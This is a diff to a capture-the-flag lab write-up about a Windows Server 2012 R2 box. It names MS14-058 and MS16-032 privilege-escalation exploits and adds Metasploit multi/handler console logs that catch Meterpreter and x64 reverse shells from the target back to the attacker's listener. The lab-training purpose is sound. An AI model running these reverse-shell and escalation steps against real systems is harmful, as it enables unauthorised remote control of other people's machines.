@@ -423,7 +423,7 @@ Microsoft Windows 8.1/ Server 2012 - 'Win32k.sys' Local Privilege Escalation (MS
 ```
 Googling "windows server 2012 r2 privilege escalation", we see an exploit for `MS16-032`.
 
-Both `MS14-058` and `MS16-032` vulnerabilties both have Metasploit exploits for them. 
+Both `MS14-058` and `MS16-032` vulnerabilties have Metasploit exploits for them. 
 
 For `MS14-058`:
 ```
@@ -452,3 +452,62 @@ Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc):
 ...
 ```
 However, they require existing Metasploit sessions before privilege esclating them.
+
+Let's try to get a Meterpreter session!
+```
+msf5 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) > show options
+...
+msf5 exploit(multi/handler) > set lhost 10.10.x.x
+lhost => 10.10.x.x
+msf5 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.10.x.x:4444 
+[*] Sending stage (201283 bytes) to 10.10.10.8
+[*] Sending stage (201283 bytes) to 10.10.10.8
+[*]  - Meterpreter session 1 closed.  Reason: Died
+[*] Meterpreter session 1 opened (10.10.x.x:4444 -> 127.0.0.1) at 2021-01-17 11:55:51 +0800
+[*] Sending stage (201283 bytes) to 10.10.10.8
+[*] Meterpreter session 2 opened (10.10.x.x:4444 -> 127.0.0.1) at 2021-01-17 11:55:52 +0800
+[*] Sending stage (201283 bytes) to 10.10.10.8
+[*]  - Meterpreter session 2 closed.  Reason: Died
+[*]  - Meterpreter session 3 closed.  Reason: Died
+[*] Meterpreter session 3 opened (10.10.x.x:4444 -> 127.0.0.1) at 2021-01-17 11:55:52 +0800
+```
+Nope, we can't get a Meterpreter shell directly.
+
+Let's try to get a regular x64 Windows reverse shell then!
+```
+msf5 > use multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf5 exploit(multi/handler) > set payload windows/x64/shell/reverse_tcp
+payload => windows/x64/shell/reverse_tcp
+msf5 exploit(multi/handler) > show options
+...
+msf5 exploit(multi/handler) > set lhost 10.10.x.x
+lhost => 10.10.x.x
+msf5 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.10.x.x:4444 
+[*] Sending stage (336 bytes) to 10.10.10.8
+[*] Command shell session 1 opened (10.10.x.x:4444 -> 10.10.10.8:49166) at 2021-01-17 11:41:46 +0800
+[*] Sending stage (336 bytes) to 10.10.10.8
+[*] Command shell session 2 opened (10.10.x.x:4444 -> 10.10.10.8:49167) at 2021-01-17 11:41:46 +0800
+[*] Sending stage (336 bytes) to 10.10.10.8
+```
+Looking at Sessions, we see we have established regular x64 shells.
+```
+msf5 exploit(multi/handler) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type               Information                                                                       Connection
+  --  ----  ----               -----------                                                                       ----------
+  1         shell x64/windows  Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All righ...  10.10.14.15:4444 -> 10.10.10.8:49166 (10.10.10.8)
+  2         shell x64/windows  Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All righ...  10.10.14.15:4444 -> 10.10.10.8:49167 (10.10.10.8)
+  3         shell windows                                                                                        10.10.14.15:4444 -> 10.10.10.8:49168 (10.10.10.8)
+```
